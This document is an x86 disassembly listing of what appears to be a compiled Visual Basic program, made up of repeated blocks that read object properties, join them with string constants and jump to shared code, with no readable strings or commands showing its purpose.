  407308:	52                   	push   %edx
  407309:	ff d3                	call   *%ebx
  40730b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407311:	8b 06                	mov    (%esi),%eax
  407313:	56                   	push   %esi
  407314:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40731a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40731d:	50                   	push   %eax
  40731e:	51                   	push   %ecx
  40731f:	ff d3                	call   *%ebx
  407321:	8b f8                	mov    %eax,%edi
  407323:	8d 45 dc             	lea    -0x24(%ebp),%eax
  407326:	50                   	push   %eax
  407327:	57                   	push   %edi
  407328:	8b 17                	mov    (%edi),%edx
  40732a:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  407330:	85 c0                	test   %eax,%eax
  407332:	db e2                	fnclex
  407334:	7d 12                	jge    0x407348
  407336:	68 a0 00 00 00       	push   $0xa0
  40733b:	68 38 30 40 00       	push   $0x403038
  407340:	57                   	push   %edi
  407341:	50                   	push   %eax
  407342:	ff 15 38 10 40 00    	call   *0x401038
  407348:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40734b:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  407351:	52                   	push   %edx
  407352:	68 c8 32 40 00       	push   $0x4032c8
  407357:	8b 39                	mov    (%ecx),%edi
  407359:	ff 15 28 10 40 00    	call   *0x401028
  40735f:	8b d0                	mov    %eax,%edx
  407361:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407364:	ff 15 38 11 40 00    	call   *0x401138
  40736a:	89 bd 74 fe ff ff    	mov    %edi,-0x18c(%ebp)
  407370:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407376:	50                   	push   %eax
  407377:	8b 85 74 fe ff ff    	mov    -0x18c(%ebp),%eax
  40737d:	57                   	push   %edi
  40737e:	e9 e6 f0 ff ff       	jmp    0x406469
  407383:	8b 16                	mov    (%esi),%edx
  407385:	56                   	push   %esi
  407386:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40738c:	50                   	push   %eax
  40738d:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407390:	50                   	push   %eax
  407391:	ff d3                	call   *%ebx
  407393:	8b 0e                	mov    (%esi),%ecx
  407395:	56                   	push   %esi
  407396:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40739c:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4073a2:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4073a5:	50                   	push   %eax
  4073a6:	52                   	push   %edx
  4073a7:	ff d3                	call   *%ebx
  4073a9:	8b f8                	mov    %eax,%edi
  4073ab:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4073ae:	51                   	push   %ecx
  4073af:	57                   	push   %edi
  4073b0:	8b 07                	mov    (%edi),%eax
  4073b2:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4073b8:	85 c0                	test   %eax,%eax
  4073ba:	db e2                	fnclex
  4073bc:	7d 12                	jge    0x4073d0
  4073be:	68 a0 00 00 00       	push   $0xa0
  4073c3:	68 38 30 40 00       	push   $0x403038
  4073c8:	57                   	push   %edi
  4073c9:	50                   	push   %eax
  4073ca:	ff 15 38 10 40 00    	call   *0x401038
  4073d0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4073d3:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4073d9:	50                   	push   %eax
  4073da:	68 d8 32 40 00       	push   $0x4032d8
  4073df:	8b 3a                	mov    (%edx),%edi
  4073e1:	ff 15 28 10 40 00    	call   *0x401028
  4073e7:	8b d0                	mov    %eax,%edx
  4073e9:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4073ec:	ff 15 38 11 40 00    	call   *0x401138
  4073f2:	8b cf                	mov    %edi,%ecx
  4073f4:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4073fa:	50                   	push   %eax
  4073fb:	57                   	push   %edi
  4073fc:	e9 86 17 00 00       	jmp    0x408b87
  407401:	8b 06                	mov    (%esi),%eax
  407403:	56                   	push   %esi
  407404:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40740a:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40740d:	50                   	push   %eax
  40740e:	51                   	push   %ecx
  40740f:	ff d3                	call   *%ebx
  407411:	8b 16                	mov    (%esi),%edx
  407413:	56                   	push   %esi
  407414:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40741a:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407420:	50                   	push   %eax
  407421:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  407424:	50                   	push   %eax
  407425:	ff d3                	call   *%ebx
  407427:	8b f8                	mov    %eax,%edi
  407429:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40742c:	52                   	push   %edx
  40742d:	57                   	push   %edi
  40742e:	8b 0f                	mov    (%edi),%ecx
  407430:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  407436:	85 c0                	test   %eax,%eax
  407438:	db e2                	fnclex
  40743a:	7d 12                	jge    0x40744e
  40743c:	68 a0 00 00 00       	push   $0xa0
  407441:	68 38 30 40 00       	push   $0x403038
  407446:	57                   	push   %edi
  407447:	50                   	push   %eax
  407448:	ff 15 38 10 40 00    	call   *0x401038
  40744e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407451:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  407457:	51                   	push   %ecx
  407458:	68 e8 32 40 00       	push   $0x4032e8
  40745d:	8b 38                	mov    (%eax),%edi
  40745f:	ff 15 28 10 40 00    	call   *0x401028
  407465:	8b d0                	mov    %eax,%edx
  407467:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40746a:	ff 15 38 11 40 00    	call   *0x401138
  407470:	8b d7                	mov    %edi,%edx
  407472:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407478:	50                   	push   %eax
  407479:	57                   	push   %edi
  40747a:	e9 52 ef ff ff       	jmp    0x4063d1
  40747f:	8b 0e                	mov    (%esi),%ecx
  407481:	56                   	push   %esi
  407482:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407488:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40748b:	50                   	push   %eax
  40748c:	52                   	push   %edx
  40748d:	ff d3                	call   *%ebx
  40748f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407495:	8b 06                	mov    (%esi),%eax
  407497:	56                   	push   %esi
  407498:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40749e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4074a1:	50                   	push   %eax
  4074a2:	51                   	push   %ecx
  4074a3:	ff d3                	call   *%ebx
  4074a5:	8b f8                	mov    %eax,%edi
  4074a7:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4074aa:	50                   	push   %eax
  4074ab:	57                   	push   %edi
  4074ac:	8b 17                	mov    (%edi),%edx
  4074ae:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4074b4:	85 c0                	test   %eax,%eax
  4074b6:	db e2                	fnclex
  4074b8:	7d 12                	jge    0x4074cc
  4074ba:	68 a0 00 00 00       	push   $0xa0
  4074bf:	68 38 30 40 00       	push   $0x403038
  4074c4:	57                   	push   %edi
  4074c5:	50                   	push   %eax
  4074c6:	ff 15 38 10 40 00    	call   *0x401038
  4074cc:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4074cf:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4074d5:	52                   	push   %edx
  4074d6:	68 f8 32 40 00       	push   $0x4032f8
  4074db:	8b 39                	mov    (%ecx),%edi
  4074dd:	ff 15 28 10 40 00    	call   *0x401028
  4074e3:	8b d0                	mov    %eax,%edx
  4074e5:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4074e8:	ff 15 38 11 40 00    	call   *0x401138
  4074ee:	89 bd 68 fe ff ff    	mov    %edi,-0x198(%ebp)
  4074f4:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4074fa:	50                   	push   %eax
  4074fb:	8b 85 68 fe ff ff    	mov    -0x198(%ebp),%eax
  407501:	57                   	push   %edi
  407502:	e9 62 ef ff ff       	jmp    0x406469
  407507:	8b 16                	mov    (%esi),%edx
  407509:	56                   	push   %esi
  40750a:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407510:	50                   	push   %eax
  407511:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407514:	50                   	push   %eax
  407515:	ff d3                	call   *%ebx
  407517:	8b 0e                	mov    (%esi),%ecx
  407519:	56                   	push   %esi
  40751a:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407520:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407526:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407529:	50                   	push   %eax
  40752a:	52                   	push   %edx
  40752b:	ff d3                	call   *%ebx
  40752d:	8b f8                	mov    %eax,%edi
  40752f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407532:	51                   	push   %ecx
  407533:	57                   	push   %edi
  407534:	8b 07                	mov    (%edi),%eax
  407536:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  40753c:	85 c0                	test   %eax,%eax
  40753e:	db e2                	fnclex
  407540:	7d 12                	jge    0x407554
  407542:	68 a0 00 00 00       	push   $0xa0
  407547:	68 38 30 40 00       	push   $0x403038
  40754c:	57                   	push   %edi
  40754d:	50                   	push   %eax
  40754e:	ff 15 38 10 40 00    	call   *0x401038
  407554:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407557:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  40755d:	50                   	push   %eax
  40755e:	68 08 33 40 00       	push   $0x403308
  407563:	8b 3a                	mov    (%edx),%edi
  407565:	ff 15 28 10 40 00    	call   *0x401028
  40756b:	8b d0                	mov    %eax,%edx
  40756d:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407570:	ff 15 38 11 40 00    	call   *0x401138
  407576:	8b cf                	mov    %edi,%ecx
  407578:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40757e:	50                   	push   %eax
  40757f:	57                   	push   %edi
  407580:	e9 02 16 00 00       	jmp    0x408b87
  407585:	8b 06                	mov    (%esi),%eax
  407587:	56                   	push   %esi
  407588:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40758e:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  407591:	50                   	push   %eax
  407592:	51                   	push   %ecx
  407593:	ff d3                	call   *%ebx
  407595:	8b 16                	mov    (%esi),%edx
  407597:	56                   	push   %esi
  407598:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40759e:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  4075a4:	50                   	push   %eax
  4075a5:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4075a8:	50                   	push   %eax
  4075a9:	ff d3                	call   *%ebx
  4075ab:	8b f8                	mov    %eax,%edi
  4075ad:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4075b0:	52                   	push   %edx
  4075b1:	57                   	push   %edi
  4075b2:	8b 0f                	mov    (%edi),%ecx
  4075b4:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4075ba:	85 c0                	test   %eax,%eax
  4075bc:	db e2                	fnclex
  4075be:	7d 12                	jge    0x4075d2
  4075c0:	68 a0 00 00 00       	push   $0xa0
  4075c5:	68 38 30 40 00       	push   $0x403038
  4075ca:	57                   	push   %edi
  4075cb:	50                   	push   %eax
  4075cc:	ff 15 38 10 40 00    	call   *0x401038
  4075d2:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4075d5:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4075db:	51                   	push   %ecx
  4075dc:	68 18 33 40 00       	push   $0x403318
  4075e1:	8b 38                	mov    (%eax),%edi
  4075e3:	ff 15 28 10 40 00    	call   *0x401028
  4075e9:	8b d0                	mov    %eax,%edx
  4075eb:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4075ee:	ff 15 38 11 40 00    	call   *0x401138
  4075f4:	8b d7                	mov    %edi,%edx
  4075f6:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4075fc:	50                   	push   %eax
  4075fd:	57                   	push   %edi
  4075fe:	e9 ce ed ff ff       	jmp    0x4063d1
  407603:	8b 0e                	mov    (%esi),%ecx
  407605:	56                   	push   %esi
  407606:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40760c:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40760f:	50                   	push   %eax
  407610:	52                   	push   %edx
  407611:	ff d3                	call   *%ebx
  407613:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407619:	8b 06                	mov    (%esi),%eax
  40761b:	56                   	push   %esi
  40761c:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  407622:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407625:	50                   	push   %eax
  407626:	51                   	push   %ecx
  407627:	ff d3                	call   *%ebx
  407629:	8b f8                	mov    %eax,%edi
  40762b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40762e:	50                   	push   %eax
  40762f:	57                   	push   %edi
  407630:	8b 17                	mov    (%edi),%edx
  407632:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  407638:	85 c0                	test   %eax,%eax
  40763a:	db e2                	fnclex
  40763c:	7d 12                	jge    0x407650
  40763e:	68 a0 00 00 00       	push   $0xa0
  407643:	68 38 30 40 00       	push   $0x403038
  407648:	57                   	push   %edi
  407649:	50                   	push   %eax
  40764a:	ff 15 38 10 40 00    	call   *0x401038
  407650:	8b 55 dc             	mov    -0x24(%ebp),%edx
  407653:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  407659:	52                   	push   %edx
  40765a:	68 28 33 40 00       	push   $0x403328
  40765f:	8b 39                	mov    (%ecx),%edi
  407661:	ff 15 28 10 40 00    	call   *0x401028
  407667:	8b d0                	mov    %eax,%edx
  407669:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40766c:	ff 15 38 11 40 00    	call   *0x401138
  407672:	89 bd 5c fe ff ff    	mov    %edi,-0x1a4(%ebp)
  407678:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40767e:	50                   	push   %eax
  40767f:	8b 85 5c fe ff ff    	mov    -0x1a4(%ebp),%eax
  407685:	57                   	push   %edi
  407686:	e9 de ed ff ff       	jmp    0x406469
  40768b:	8b 16                	mov    (%esi),%edx
  40768d:	56                   	push   %esi
  40768e:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407694:	50                   	push   %eax
  407695:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407698:	50                   	push   %eax
  407699:	ff d3                	call   *%ebx
  40769b:	8b 0e                	mov    (%esi),%ecx
  40769d:	56                   	push   %esi
  40769e:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4076a4:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4076aa:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4076ad:	50                   	push   %eax
  4076ae:	52                   	push   %edx
  4076af:	ff d3                	call   *%ebx
  4076b1:	8b f8                	mov    %eax,%edi
  4076b3:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4076b6:	51                   	push   %ecx
  4076b7:	57                   	push   %edi
  4076b8:	8b 07                	mov    (%edi),%eax
  4076ba:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4076c0:	85 c0                	test   %eax,%eax
  4076c2:	db e2                	fnclex
  4076c4:	7d 12                	jge    0x4076d8
  4076c6:	68 a0 00 00 00       	push   $0xa0
  4076cb:	68 38 30 40 00       	push   $0x403038
  4076d0:	57                   	push   %edi
  4076d1:	50                   	push   %eax
  4076d2:	ff 15 38 10 40 00    	call   *0x401038
  4076d8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4076db:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4076e1:	50                   	push   %eax
  4076e2:	68 38 33 40 00       	push   $0x403338
  4076e7:	8b 3a                	mov    (%edx),%edi
  4076e9:	ff 15 28 10 40 00    	call   *0x401028
  4076ef:	8b d0                	mov    %eax,%edx
  4076f1:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4076f4:	ff 15 38 11 40 00    	call   *0x401138
  4076fa:	8b cf                	mov    %edi,%ecx
  4076fc:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407702:	50                   	push   %eax
  407703:	57                   	push   %edi
  407704:	e9 7e 14 00 00       	jmp    0x408b87
  407709:	8b 06                	mov    (%esi),%eax
  40770b:	56                   	push   %esi
  40770c:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  407712:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  407715:	50                   	push   %eax
  407716:	51                   	push   %ecx
  407717:	ff d3                	call   *%ebx
  407719:	8b 16                	mov    (%esi),%edx
  40771b:	56                   	push   %esi
  40771c:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407722:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407728:	50                   	push   %eax
  407729:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40772c:	50                   	push   %eax
  40772d:	ff d3                	call   *%ebx
  40772f:	8b f8                	mov    %eax,%edi
  407731:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407734:	52                   	push   %edx
  407735:	57                   	push   %edi
  407736:	8b 0f                	mov    (%edi),%ecx
  407738:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40773e:	85 c0                	test   %eax,%eax
  407740:	db e2                	fnclex
  407742:	7d 12                	jge    0x407756
  407744:	68 a0 00 00 00       	push   $0xa0
  407749:	68 38 30 40 00       	push   $0x403038
  40774e:	57                   	push   %edi
  40774f:	50                   	push   %eax
  407750:	ff 15 38 10 40 00    	call   *0x401038
  407756:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407759:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  40775f:	51                   	push   %ecx
  407760:	68 48 33 40 00       	push   $0x403348
  407765:	8b 38                	mov    (%eax),%edi
  407767:	ff 15 28 10 40 00    	call   *0x401028
  40776d:	8b d0                	mov    %eax,%edx
  40776f:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407772:	ff 15 38 11 40 00    	call   *0x401138
  407778:	8b d7                	mov    %edi,%edx
  40777a:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407780:	50                   	push   %eax
  407781:	57                   	push   %edi
  407782:	e9 4a ec ff ff       	jmp    0x4063d1
  407787:	8b 0e                	mov    (%esi),%ecx
  407789:	56                   	push   %esi
  40778a:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407790:	8d 55 d0             	lea    -0x30(%ebp),%edx
  407793:	50                   	push   %eax
  407794:	52                   	push   %edx
  407795:	ff d3                	call   *%ebx
  407797:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40779d:	8b 06                	mov    (%esi),%eax
  40779f:	56                   	push   %esi
  4077a0:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  4077a6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4077a9:	50                   	push   %eax
  4077aa:	51                   	push   %ecx
  4077ab:	ff d3                	call   *%ebx
  4077ad:	8b f8                	mov    %eax,%edi
  4077af:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4077b2:	50                   	push   %eax
  4077b3:	57                   	push   %edi
  4077b4:	8b 17                	mov    (%edi),%edx
  4077b6:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4077bc:	85 c0                	test   %eax,%eax
  4077be:	db e2                	fnclex
  4077c0:	7d 12                	jge    0x4077d4
  4077c2:	68 a0 00 00 00       	push   $0xa0
  4077c7:	68 38 30 40 00       	push   $0x403038
  4077cc:	57                   	push   %edi
  4077cd:	50                   	push   %eax
  4077ce:	ff 15 38 10 40 00    	call   *0x401038
  4077d4:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4077d7:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4077dd:	52                   	push   %edx
  4077de:	68 58 33 40 00       	push   $0x403358
  4077e3:	8b 39                	mov    (%ecx),%edi
  4077e5:	ff 15 28 10 40 00    	call   *0x401028
  4077eb:	8b d0                	mov    %eax,%edx
  4077ed:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4077f0:	ff 15 38 11 40 00    	call   *0x401138
  4077f6:	89 bd 50 fe ff ff    	mov    %edi,-0x1b0(%ebp)
  4077fc:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407802:	50                   	push   %eax
  407803:	8b 85 50 fe ff ff    	mov    -0x1b0(%ebp),%eax
  407809:	57                   	push   %edi
  40780a:	e9 5a ec ff ff       	jmp    0x406469
  40780f:	8b 16                	mov    (%esi),%edx
  407811:	56                   	push   %esi
  407812:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407818:	50                   	push   %eax
  407819:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40781c:	50                   	push   %eax
  40781d:	ff d3                	call   *%ebx
  40781f:	8b 0e                	mov    (%esi),%ecx
  407821:	56                   	push   %esi
  407822:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407828:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40782e:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407831:	50                   	push   %eax
  407832:	52                   	push   %edx
  407833:	ff d3                	call   *%ebx
  407835:	8b f8                	mov    %eax,%edi
  407837:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40783a:	51                   	push   %ecx
  40783b:	57                   	push   %edi
  40783c:	8b 07                	mov    (%edi),%eax
  40783e:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  407844:	85 c0                	test   %eax,%eax
  407846:	db e2                	fnclex
  407848:	7d 12                	jge    0x40785c
  40784a:	68 a0 00 00 00       	push   $0xa0
  40784f:	68 38 30 40 00       	push   $0x403038
  407854:	57                   	push   %edi
  407855:	50                   	push   %eax
  407856:	ff 15 38 10 40 00    	call   *0x401038
  40785c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40785f:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  407865:	50                   	push   %eax
  407866:	68 68 33 40 00       	push   $0x403368
  40786b:	8b 3a                	mov    (%edx),%edi
  40786d:	ff 15 28 10 40 00    	call   *0x401028
  407873:	8b d0                	mov    %eax,%edx
  407875:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407878:	ff 15 38 11 40 00    	call   *0x401138
  40787e:	8b cf                	mov    %edi,%ecx
  407880:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407886:	50                   	push   %eax
  407887:	57                   	push   %edi
  407888:	e9 fa 12 00 00       	jmp    0x408b87
  40788d:	8b 06                	mov    (%esi),%eax
  40788f:	56                   	push   %esi
  407890:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  407896:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  407899:	50                   	push   %eax
  40789a:	51                   	push   %ecx
  40789b:	ff d3                	call   *%ebx
  40789d:	8b 16                	mov    (%esi),%edx
  40789f:	56                   	push   %esi
  4078a0:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4078a6:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  4078ac:	50                   	push   %eax
  4078ad:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4078b0:	50                   	push   %eax
  4078b1:	ff d3                	call   *%ebx
  4078b3:	8b f8                	mov    %eax,%edi
  4078b5:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4078b8:	52                   	push   %edx
  4078b9:	57                   	push   %edi
  4078ba:	8b 0f                	mov    (%edi),%ecx
  4078bc:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4078c2:	85 c0                	test   %eax,%eax
  4078c4:	db e2                	fnclex
  4078c6:	7d 12                	jge    0x4078da
  4078c8:	68 a0 00 00 00       	push   $0xa0
  4078cd:	68 38 30 40 00       	push   $0x403038
  4078d2:	57                   	push   %edi
  4078d3:	50                   	push   %eax
  4078d4:	ff 15 38 10 40 00    	call   *0x401038
  4078da:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4078dd:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4078e3:	51                   	push   %ecx
  4078e4:	68 78 33 40 00       	push   $0x403378
  4078e9:	8b 38                	mov    (%eax),%edi
  4078eb:	ff 15 28 10 40 00    	call   *0x401028
  4078f1:	8b d0                	mov    %eax,%edx
  4078f3:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4078f6:	ff 15 38 11 40 00    	call   *0x401138
  4078fc:	8b d7                	mov    %edi,%edx
  4078fe:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407904:	50                   	push   %eax
  407905:	57                   	push   %edi
  407906:	e9 c6 ea ff ff       	jmp    0x4063d1
  40790b:	8b 0e                	mov    (%esi),%ecx
  40790d:	56                   	push   %esi
  40790e:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407914:	8d 55 d0             	lea    -0x30(%ebp),%edx
  407917:	50                   	push   %eax
  407918:	52                   	push   %edx
  407919:	ff d3                	call   *%ebx
  40791b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407921:	8b 06                	mov    (%esi),%eax
  407923:	56                   	push   %esi
  407924:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40792a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40792d:	50                   	push   %eax
  40792e:	51                   	push   %ecx
  40792f:	ff d3                	call   *%ebx
  407931:	8b 10                	mov    (%eax),%edx
  407933:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407936:	51                   	push   %ecx
  407937:	50                   	push   %eax
  407938:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40793e:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  407944:	85 c0                	test   %eax,%eax
  407946:	db e2                	fnclex
  407948:	7d 18                	jge    0x407962
  40794a:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  407950:	68 a0 00 00 00       	push   $0xa0
  407955:	68 38 30 40 00       	push   $0x403038
  40795a:	52                   	push   %edx
  40795b:	50                   	push   %eax
  40795c:	ff 15 38 10 40 00    	call   *0x401038
  407962:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407965:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  40796b:	89 45 98             	mov    %eax,-0x68(%ebp)
  40796e:	b8 08 00 00 00       	mov    $0x8,%eax
  407973:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407976:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40797d:	89 45 90             	mov    %eax,-0x70(%ebp)
  407980:	c7 85 58 ff ff ff f8 	movl   $0x4031f8,-0xa8(%ebp)
  407987:	31 40 00 
  40798a:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407990:	ff 15 20 11 40 00    	call   *0x401120
  407996:	c7 85 68 ff ff ff 88 	movl   $0x403388,-0x98(%ebp)
  40799d:	33 40 00 
  4079a0:	e9 7a f2 ff ff       	jmp    0x406c1f
  4079a5:	8b 16                	mov    (%esi),%edx
  4079a7:	56                   	push   %esi
  4079a8:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  4079ae:	50                   	push   %eax
  4079af:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4079b2:	50                   	push   %eax
  4079b3:	ff d3                	call   *%ebx
  4079b5:	8b 0e                	mov    (%esi),%ecx
  4079b7:	56                   	push   %esi
  4079b8:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4079be:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4079c4:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4079c7:	50                   	push   %eax
  4079c8:	52                   	push   %edx
  4079c9:	ff d3                	call   *%ebx
  4079cb:	8b 08                	mov    (%eax),%ecx
  4079cd:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4079d0:	52                   	push   %edx
  4079d1:	50                   	push   %eax
  4079d2:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4079d8:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4079de:	85 c0                	test   %eax,%eax
  4079e0:	db e2                	fnclex
  4079e2:	7d 18                	jge    0x4079fc
  4079e4:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  4079ea:	68 a0 00 00 00       	push   $0xa0
  4079ef:	68 38 30 40 00       	push   $0x403038
  4079f4:	51                   	push   %ecx
  4079f5:	50                   	push   %eax
  4079f6:	ff 15 38 10 40 00    	call   *0x401038
  4079fc:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4079ff:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407a05:	89 45 98             	mov    %eax,-0x68(%ebp)
  407a08:	b8 08 00 00 00       	mov    $0x8,%eax
  407a0d:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407a10:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407a17:	89 45 90             	mov    %eax,-0x70(%ebp)
  407a1a:	c7 85 58 ff ff ff 98 	movl   $0x403398,-0xa8(%ebp)
  407a21:	33 40 00 
  407a24:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407a2a:	ff 15 20 11 40 00    	call   *0x401120
  407a30:	c7 85 68 ff ff ff 90 	movl   $0x403390,-0x98(%ebp)
